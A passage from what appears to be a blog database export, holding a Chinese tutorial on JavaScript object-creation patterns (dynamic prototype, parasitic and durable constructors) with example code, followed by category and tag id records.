&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“function”</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);<br>person1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;<br> &nbsp; &nbsp;<br>&nbsp; o.job = job;<br> &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//“wei”</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“|”</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“red”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“blue”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“green”</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“weiqi”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p></p>\n<blockquote>\n<p>转自：<a href=\"http://blog.csdn.net/u014346301/article/details/52204967\">http://blog.csdn.net/u014346301/article/details/52204967</a></p>\n</blockquote>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"civym300a0007cdonlll89l69","category_id":"civym300e0009cdon6m9k7for","_id":"civym300q000jcdonrvzazwl5"},{"post_id":"civym300d0008cdonnug9xmxw","category_id":"civym300o000fcdonr5qfmkhq","_id":"civym300u000rcdonblp47fzy"},{"post_id":"civym300h000dcdon4p3x5b8y","category_id":"civym300r000lcdonqmasczma","_id":"civym300z000ycdonc4vjp1lm"},{"post_id":"civym300m000ecdonvrzlpvm3","category_id":"civym300u000scdon3dj2w38p","_id":"civym30170015cdonuuzfmh6f"},{"post_id":"civym300y000xcdone9gmir4j","category_id":"civym300u000scdon3dj2w38p","_id":"civym3019001acdon3bdxfd6w"},{"post_id":"civym300u000qcdonn7zxlnbc","category_id":"civym30110010cdon4juz0m2x","_id":"civym301c001dcdonyj795nfq"},{"post_id":"civym30170017cdonzyn2h86c","category_id":"civym300o000fcdonr5qfmkhq","_id":"civym301e001hcdonqsaseq0l"},{"post_id":"civym30120012cdonqr1a0dlh","category_id":"civym30180018cdonk7ff8vtr","_id":"civym301h001lcdonhslnjo1x"},{"post_id":"civym30150014cdond8ck5187","category_id":"civym301d001fcdondrranodf","_id":"civym301m001scdon898nfinc"},{"post_id":"civym301k001pcdon5enqatvd","category_id":"civym301i001ncdonlf5tbmrh","_id":"civym301o001wcdonpk9h9s4b"},{"post_id":"civym301a001ccdonqed16spk","category_id":"civym301i001ncdonlf5tbmrh","_id":"civym301p001zcdonooyjj86b"},{"post_id":"civym301s0025cdonkqxsk9ox","category_id":"civym30110010cdon4juz0m2x","_id":"civym301z002bcdonchjymmxb"},{"post_id":"civym301o001xcdon22ahbwc8","category_id":"civym301q0022cdontoblnk47","_id":"civym3020002ecdondlte2rsk"},{"post_id":"civym301p0020cdon4qovu2hh","category_id":"civym301x0028cdonqxb6m4pv","_id":"civym3020002gcdonjme1k9sz"},{"post_id":"civym301t0027cdonz0kj5lou","category_id":"civym301z002dcdonplilzqgb","_id":"civym3020002jcdon11i18mmi"},{"post_id":"civym30360031cdon6zinl5ht","category_id":"civym301i001ncdonlf5tbmrh","_id":"civym30380033cdonc5415ehj"}],"PostTag":[{"post_id":"civym30000002cdon46cgwvtf","tag_id":"civym30060006cdonzu152yen","_id":"civym300g000ccdon9973vfbe"},{"post_id":"civym30020004cdon8s1nrxgk","tag_id":"civym300f000bcdonsrz4vms6","_id":"civym300p000icdon5w4w1drq"},{"post_id":"civym300o000hcdonqll99txq","tag_id":"civym300f000bcdonsrz4vms6","_id":"civym300s000ncdon497cm7aa"},{"post_id":"civym300a0007cdonlll89l69","tag_id":"civym300o000gcdonb4edc6fy","_id":"civym300t000pcdonsv7knoec"},{"post_id":"civym300q000kcdon055numlt","tag_id":"civym30060006cdonzu152yen","_id":"civym300v000tcdon0g7r75kw"},{"post_id":"civym300d0008cdonnug9xmxw","tag_id":"civym300r000mcdoniuglw2uo","_id":"civym300y000wcdonyqcvbbfq"},{"post_id":"civym300u000qcdonn7zxlnbc","tag_id":"civym300f000bcdonsrz4vms6","_id":"civym3011000zcdonfo2n5cp9"},{"post_id":"civym300v000vcdondrbsxafd","tag_id":"civym30060006cdonzu152yen","_id":"civym30140013cdonuwqmhdhi"},{"post_id":"civym300e000acdonyj0f52n0","tag_id":"civym300f000bcdonsrz4vms6","_id":"civym30170016cdongmyquwqc"},{"post_id":"civym300h000dcdon4p3x5b8y","tag_id":"civym30110011cdonxfaxlsnk","_id":"civym301a001bcdoncgs0brfv"},{"post_id":"civym300m000ecdonvrzlpvm3","tag_id":"civym30180019cdon130gtct6","_id":"civym301f001jcdonjhu6e5u6"},{"post_id":"civym301e001icdon14f12do6","tag_id":"civym30060006cdonzu152yen","_id":"civym301j001ocdon5ayr67qo"},{"post_id":"civym300s000ocdonqs2ei5e0","tag_id":"civym30110011cdonxfaxlsnk","_id":"civym301l001qcdonwcubmzsb"},{"post_id":"civym300y000xcdone9gmir4j","tag_id":"civym30180019cdon130gtct6","_i